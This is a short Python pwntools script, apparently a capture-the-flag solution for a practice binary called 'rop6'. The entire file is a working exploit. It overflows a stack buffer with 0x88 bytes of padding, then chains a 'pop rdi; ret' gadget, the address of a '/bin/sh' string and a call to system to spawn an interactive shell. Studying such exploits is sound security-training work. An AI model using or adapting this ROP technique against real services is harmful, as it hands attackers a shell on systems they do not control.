from pwn import *

r=process('./pwn/stack/rop-6/rop6')

context.arch="amd64"# x64
context.terminal=["tmux","splitw","-h"]
#gdb.attach(r)

payload=flat(
b'b'*(0x88),
0x04006b3,#pop rdi ; ret 
0x0600A90,#/bin/sh
0x040063E #system
)
r.send(payload)
r.interactive()